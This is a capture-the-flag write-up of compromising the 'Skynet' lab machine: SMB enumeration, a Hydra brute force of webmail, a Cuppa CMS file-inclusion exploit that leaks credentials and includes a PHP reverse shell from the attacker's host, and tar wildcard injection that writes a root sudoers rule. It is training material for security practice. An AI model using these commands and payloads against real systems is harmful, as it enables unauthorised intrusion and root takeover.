# Skynet — Write-up

## Objective

A vulnerable Terminator-themed Linux machine. Are you able to compromise this Terminator-themed machine?

**Questions to answer:**

- What is the user flag?
- What is the root flag?

---

## Initial Recon

```bash
nmap -sS -sV -sC -p- -append-output 10.81.180.140
```

```
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Skynet
110/tcp open  pop3        Dovecot pop3d
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
```

---

## SMB Enumeration

I noticed SMB had weak security from the Nmap scan. I checked the users and was only able to log into one, using:

```bash
smbclient //10.81.180.140/anonymous -N
```

I was able to download a file called `log1.txt` with different varieties of a username.

---

## Finding the Mail Login and Brute-Forcing It

```bash
ffuf -w raft-medium-words.txt -u http://10.81.180.140/FUZZ -t 50 -mc 200 -recursion
```

Using this command I found `http://10.81.180.140/squirrelmail/`, which brings me to a mail login page. I used the passwords collected from SMB and the username `milesdyson`, and brute-forced the login page with Hydra:

```bash
hydra -l milesdyson -P log1.txt 10.81.180.140 http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^:Unknown user or password"
```

This successfully found the correct password: `cyborg007haloterminator`. Huzzah!

---

## Reading the Mail

Inside the login there's 3 mails.

**Mail 1 — Samba password reset:**

```
Subject:   Samba Password reset
From:      skynet@skynet

We have changed your smb password after system malfunction.
Password: )s{A&2Z=F^n_E.B`
```

**Mail 2 — from serenakogan@skynet** — a block of binary that decodes to a repeated taunting message ("balls have zero to me to me to me...").

**Mail 3 — from serenakogan@skynet** — more of the same taunting, garbled text.

I'm going to focus on the first email and see what I can discover. Downloading the attached files I received a lot of irrelevant nonsense, but found `important.txt`, which contained:

```
1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```

---

## Finding and Exploiting Cuppa CMS

Doing a quick Gobuster scan on `http://10.81.180.140/45kra24zxs28v3yd/` I found `/administrator`. I'm also assuming the two previous emails I haven't touched will relate to the login page — after some decoding, they turned out to be useless. Great!

Inside the admin login page I found:

```html
class="forgot_password" onclick="ShowPanel('forget')">Forgot Password?
```

Typing `ShowPanel('forget')` into the inspect element console brought up a new input box, which led to nothing. I decided to go an easier route: since there's a massive Cuppa CMS logo, I used Searchsploit to find any working exploits.

```bash
searchsploit cuppa
```

```
Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion | php/webapps/25971.txt
```

Using the exploit to read the CMS's own config file via a `php://filter` LFI:

```
http://10.81.180.140/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php
```

Decoding the returned base64 gave me:

```php
<?php
    class Configuration{
        public $host = "localhost";
        public $db = "cuppa";
        public $user = "root";
        public $password = "password123";
        public $table_prefix = "cu_";
        public $administrator_template = "default";
        public $list_limit = 25;
        public $token = "OBqIPqlFWf3X";
        public $allowed_extensions = "*.bmp; *.csv; *.doc; *.gif; *.ico; *.jpg; *.jpeg; *.odg; *.odp; *.ods; *.odt; *.pdf; *.png; *.ppt; *.swf; *.txt; *.xcf; *.xls; *.docx; *.xlsx";
        public $upload_default_path = "media/uploadsFiles";
        public $maximum_file_size = "5242880";
        public $secure_login = 0;
        public $secure_login_value = "";
        public $secure_login_redirect = "";
    }
?>
```

---

## Getting a Reverse Shell

Since the same `alertConfigField.php` endpoint would happily include a remote URL, not just a local file, I set up a listener and a web server to serve a PHP reverse shell:

```bash
nc -lvnp 1234
python3 -m http.server 1235
```

I grabbed a standard PHP reverse shell payload from:

```
https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
```

Then triggered it through the RFI:

```
http://10.81.180.140/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://192.168.132.61:1235/shell.php
```

This gave me a reverse shell!

---

## Finding the User Flag

Going into `/home/milesdyson` we can grab the first flag.

**Flag:** `7ce5c2109a###########0a9ae807`

---

## Privilege Escalation — Tar Wildcard Injection

I had a quick check inside crontab and found a scheduled job running `/home/milesdyson/backups/backup.sh`. Looking at the script, it `tar`s up the contents of `/var/www/html` as root on a timer, using a wildcard (e.g. `tar -zcf backup.tar.gz *`) — which is the classic setup for a **tar wildcard injection** privilege escalation.

Because `tar` expands `*` in the current directory and treats anything starting with a dash as a command-line option, dropping specially-named files into `/var/www/html` lets an attacker smuggle `tar` flags in. Specifically, `--checkpoint` and `--checkpoint-action=exec=<command>` can be abused to make `tar` execute an arbitrary command mid-archive, as whatever user runs the cron job — root, in this case.

I created a small script that appends a passwordless sudo rule for `www-data`:

```bash
echo 'echo "www-data ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root-shell.sh
```

Then, inside `/var/www/html`, I dropped two files whose names `tar` would interpret as command-line flags rather than filenames when it globbed the directory with `*`:

```bash
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh root-shell.sh"
```

When the cron job next ran `tar` against `/var/www/html/*`, these two "files" were picked up and interpreted as `tar` options, causing `tar` to execute `root-shell.sh` as root partway through the backup — appending the sudoers line and giving `www-data` full passwordless `sudo`.

Once the cron job fired, I confirmed the new sudo rule and escalated:

```bash
sudo -i
cat /root/root.txt
```

Finally getting the last flag.

**Flag:** `3f03########a282cd6a949`

---

## Summary

- **Recon:** Nmap showed SSH, HTTP, POP3/IMAP (Dovecot), and SMB (two Samba versions) — SMB stood out as poorly secured.
- **SMB → username list:** Anonymous SMB access leaked `log1.txt`, a list of username variants, and pointed at `milesdyson` as a likely account.
- **Webmail brute force:** Fuzzing found a SquirrelMail login. Hydra, combined with the leaked username and password list, cracked `milesdyson`'s mail credentials.
- **Mail recon:** The mailbox contained an SMB password reset (unused red herring), two taunting/binary-encoded distractions, and a genuinely useful note pointing at a hidden Cuppa CMS path.
- **Cuppa CMS LFI/RFI:** Cuppa CMS's `alertConfigField.php` was vulnerable to a known LFI (used to leak DB credentials via `php://filter`) and doubled as an RFI, letting a remote PHP reverse shell be included and executed directly — giving a foothold and the **user flag**.
- **Tar wildcard privesc:** A root-owned cron job ran `tar` with a wildcard over a web-writable directory. Dropping filenames that `tar` interpreted as `--checkpoint`/`--checkpoint-action` flags let an arbitrary command run as root, used to grant `www-data` passwordless `sudo` and read the **root flag**.

**Key takeaways:**

- Anonymous/guest SMB shares are still a common and effective initial recon vector — don't skip checking them even on modern-looking boxes.
- Reused or related passwords across services (SMB, webmail, CMS) make brute-forcing dramatically more effective once one password list is obtained.
- Any endpoint that fetches a "config" URL server-side (even one meant only for local files) is worth testing for full RFI — if it accepts `http://`, it can usually be pointed at attacker-controlled code.
- Never run `tar`, `chown`, `rsync`, or similar wildcard-expanding commands as root over a directory writable by a lower-privileged user — filenames beginning with `-` can be interpreted as command flags and lead directly to code execution as root (GTFOBins-style wildcard injection).
